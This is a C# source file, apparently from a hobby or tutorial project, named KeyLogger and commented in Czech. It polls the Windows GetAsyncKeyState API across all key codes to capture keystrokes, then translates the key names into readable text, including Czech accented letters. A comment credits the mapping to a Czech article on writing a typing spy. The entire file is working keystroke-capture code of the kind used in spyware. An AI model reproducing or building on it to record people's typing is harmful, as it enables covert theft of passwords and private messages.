using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public static class Key
    {
        // Deklarujeme WinAPI metodu GetAsyncKeyState knihovny user32.dll, která vrací aktuálně stisknutou klávesu
        [DllImport("user32.dll")] // budeme používat tuto knihovnu
        private static extern short GetAsyncKeyState(int vKey);



        /* Metoda pro nahrazování znaků.
         * KeyLogger vrací například po stitku mezery slovo "Space", tato metoda
         * se postará o to, aby nahradila slovo Space jiným textem, v naše případě
         * se slova "Space" nahradí skutečnou mezerou, tedy " ".
         * Tato "tabulka" byla stažená ze zdroje: http://www.zive.cz/clanky/stante-se-programatorem-spion-ktery-vi-co-pisete/sc-3-a-143551/default.aspx
         */
        public static string ReplaceChars(string text)
        {
            text = text.Replace("Space", " ");
            text = text.Replace("Delete", "<Del>");
            text = text.Replace("LShiftKey", "");
            text = text.Replace("ShiftKey", "");
            text = text.Replace("OemQuotes", "!");
            text = text.Replace("Oemcomma", "?");
            text = text.Replace("D8", "á");
            text = text.Replace("D2", "ě");
            text = text.Replace("D3", "š");
            text = text.Replace("D4", "č");
            text = text.Replace("D5", "ř");
            text = text.Replace("D6", "ž");
            text = text.Replace("D7", "ý");
            text = text.Replace("D9", "í");
            text = text.Replace("D0", "é");
            text = text.Replace("Back", "<==");
            text = text.Replace("LButton", "");
            text = text.Replace("RButton", "");
            text = text.Replace("NumPad", "");
            text = text.Replace("OemPeriod", ".");
            text = text.Replace("OemSemicolon", ",");
            text = text.Replace("Oem4", "/");
            text = text.Replace("LControlKey", "");
            text = text.Replace("ControlKey", "<CTRL>");
            //text = text.Replace("Enter", "<ENT>");
            text = text.Replace("Enter", Environment.NewLine);
            text = text.Replace("Shift", "");
            return text;
        }

        // zde probíhá samotné zachytávání znaků
        public static string GetBuffKeys()
        {
            string buffer = string.Empty;
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                    buffer += Enum.GetName(typeof(Keys), i); 
            }
            //text += buffer;
            return ReplaceChars(buffer);
        }
    }
}
